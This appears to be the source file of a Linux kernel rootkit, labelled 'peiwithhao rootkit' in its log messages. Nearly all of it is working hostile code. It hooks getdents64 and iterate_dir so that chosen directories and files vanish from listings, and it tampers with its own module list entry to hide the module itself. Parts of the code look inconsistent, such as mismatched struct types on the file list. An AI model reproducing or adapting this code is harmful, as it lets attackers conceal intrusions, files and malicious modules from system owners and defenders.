#define _GNU_SOURCE
#include "hidden.h"
#include "helper.h"


/* 存放所有被隐藏的目录 */
LIST_HEAD(system_dir_hooked_list);
struct dir_hooked{
    char name[DIR_PATH_NR];
    struct list_head dir_hooked_list;
};


/* 存放所有被隐藏的文件 */
LIST_HEAD(system_file_hooked_list);
struct file_hooked{
    char name[FILE_PATH_NR];
    struct list_head file_hooked_list;
};


static size_t __maybe_unused getdents64_before_hooker(struct pt_regs *regs){
    return 0;
}


static size_t __maybe_unused getdents64_after_hooker(struct pt_regs *regs, size_t *ret){
    struct dir_hooked *pos, *tmp;
    unsigned long copy_nr;
    char dir_name[DIR_PATH_NR] = {0};
    copy_nr = copy_from_user((void *)dir_name, *(void **)(regs->di), DIR_PATH_NR);

    list_for_each_entry_safe(pos, tmp, &system_dir_hooked_list, dir_hooked_list) {
        if(strstr(dir_name, pos->name)){
            *ret = 0;
            return 0;
        }
    }
    return 0;
}

ssize_t dir_hidden_weak(char *dirname){
    struct hook_context *getdents_hook_ctx = hook_ctx_init();
    struct dir_hooked *dir_hooked_ptr = (struct dir_hooked *)kmalloc(sizeof(struct dir_hooked), GFP_KERNEL);
    memcpy(dir_hooked_ptr->name, dirname, DIR_PATH_NR);
    /* 连接到全局隐藏文件夹列表 */
    list_add_tail(&dir_hooked_ptr->dir_hooked_list, &system_dir_hooked_list);
    sys_call_table_finder();
    if(!getdents_hook_ctx){
        printk(KERN_INFO "[peiwithhao rootkit] hook_ctx alloc failed...");
        return 1;
    }
    hookpoint_add(getdents_hook_ctx, (size_t)((size_t *)syscall_table_addr)[217], (size_t)&getdents64_before_hooker, (size_t)&getdents64_after_hooker, HOOK_COVER_ONCE);
    return 0;
}
char evil_file_name[FILE_PATH_NR] = ".";

static size_t __maybe_unused actor_before_hooker(struct pt_regs *regs){
    char *file_name = (char *)regs->si;
    struct dir_hooked *pos, *tmp;
    // printk(KERN_INFO "[peiwithhao rootkit] current filename: %s", file_name);
    list_for_each_entry_safe(pos, tmp, &system_file_hooked_list, dir_hooked_list) {
        if(strstr(file_name, pos->name)){
            // regs->dx = 0;
            // regs->cx = 0;
            //regs->si = (size_t)evil_file_name;
            // printk(KERN_INFO "[peiwithhao rootkit] superise target: %s", (char *)regs->si);
            /* 用来跳过函数 */
            return 1;
        }
    }
    return 0;
}

static void __maybe_unused actor_after_hooker(struct pt_regs *regs, size_t *ret){
    char *file_name = (char *)regs->si;
    struct dir_hooked *pos, *tmp;
    printk(KERN_INFO "[peiwithhao rootkit] current filename: %s", file_name);
    list_for_each_entry_safe(pos, tmp, &system_file_hooked_list, dir_hooked_list) {
        if(strstr(file_name, pos->name)){
            *ret = false;
            return;
        }
    }
}


/* iterate_dir hook ,这要是用来获取actor然后进行永久hook */
static size_t iterate_dir_before_hooker(struct pt_regs *regs){
    struct dir_context *ctx = (struct dir_context *)regs->si;
    struct hook_context *actor_hook_ctx = hook_ctx_init();
    hookpoint_add(actor_hook_ctx, (size_t)ctx->actor, (size_t)&actor_before_hooker, (size_t)NULL, HOOK_ETERNAL);
    return 0;
}
// 普通文件的hook
/* 需要hook两点
    1. iterator_dir
    2. dir_context->actor
    */
ssize_t file_hidden(char *filename){
    /* hook iterate_dir */
    struct hook_context *iterate_dir_hook_ctx = hook_ctx_init();
    struct file_hooked *file_hooked_ptr = (struct file_hooked *)kmalloc(sizeof(struct file_hooked), GFP_KERNEL);
    memcpy(file_hooked_ptr->name, filename, DIR_PATH_NR);
    /* 链接到全局隐藏文件列表 */
    list_add_tail(&file_hooked_ptr->file_hooked_list, &system_file_hooked_list);
    if(!iterate_dir_hook_ctx){
        printk(KERN_INFO "[peiwithhao rootkit] hook_ctx alloc failed...");
        return 1;
    }
    hookpoint_add(iterate_dir_hook_ctx, (size_t)&iterate_dir, (size_t)&iterate_dir_before_hooker, (size_t)NULL, HOOK_ONCE);
    return 0;
}

ssize_t module_hidden(void){
    struct list_head *list;
    list = &(THIS_MODULE->list);
    printk(KERN_INFO "[peiwithhao rootkit] this module addr 0x%lx", (long unsigned int)list);
    list->next->prev = list->next;
    list->next->next = list->next;
    return 0;
}



